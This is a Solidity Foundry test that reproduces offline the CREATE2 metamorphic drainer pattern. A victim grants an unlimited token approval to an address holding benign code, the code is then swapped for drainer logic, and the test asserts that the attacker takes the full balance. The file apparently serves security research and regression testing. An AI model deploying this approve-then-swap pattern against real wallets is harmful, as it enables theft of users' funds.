// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {MockERC20} from "../src/MockERC20.sol";
import {
    BenignLogic,
    DrainerLogic,
    MetamorphicSpender,
    VulnerableApprover
} from "../src/Create2Vector.sol";

/// @title create2-metamorphic (b) real-incident fixture: approved-address code swap.
/// @notice Minimized OFFLINE repro (no live RPC) of the CREATE2 abuse pattern documented by
///         Scam Sniffer / BleepingComputer (CREATE2 drainers, ~$60M from ~99K victims over six
///         months, 2023-2024) and MixBytes (metamorphic address reuse): a victim approves a
///         contract that holds benign code at a deterministic address, the attacker mutates the
///         code at that same address to a drainer, and the standing approval is spent by the
///         hostile logic. Code mutation at a fixed address is modeled with a swappable
///         implementation because EIP-6780 (Cancun, 2024) restricts the literal
///         SELFDESTRUCT-redeploy; proof level is class-level. See PROVENANCE.md.
contract Create2MetamorphicIncidentTest is Test {
    address constant ATTACKER = address(0xBAD);
    uint256 constant VICTIM_BALANCE = 500e18;

    function _report(string memory target, bool drained) internal pure {
        console.log(
            string.concat(
                "[create2-metamorphic] target=", target, " verdict=", drained ? "VULNERABLE" : "BLOCKED"
            )
        );
    }

    function test_metamorphicApproveIncident_isDrained() public {
        MockERC20 token = new MockERC20();
        BenignLogic benign = new BenignLogic();
        MetamorphicSpender spender = new MetamorphicSpender(address(benign));

        VulnerableApprover victim = new VulnerableApprover();
        token.mint(address(victim), VICTIM_BALANCE);
        // Victim approves the deterministic address while it carries benign code.
        victim.trustAndApprove(address(token), address(spender), type(uint256).max);

        // The attacker mutates the code at that same address to a drainer, then spends the
        // still-valid approval.
        DrainerLogic drainer = new DrainerLogic();
        spender.swapCode(address(drainer));
        spender.execute(
            abi.encodeWithSelector(DrainerLogic.drain.selector, address(token), address(victim), ATTACKER)
        );

        bool drained = token.balanceOf(ATTACKER) == VICTIM_BALANCE && token.balanceOf(address(victim)) == 0;
        _report("metamorphic-approve-victim", drained);

        assertTrue(drained, "swapped code should drain the standing approval");
        assertEq(token.balanceOf(ATTACKER), VICTIM_BALANCE, "attacker received the full balance");
    }
}
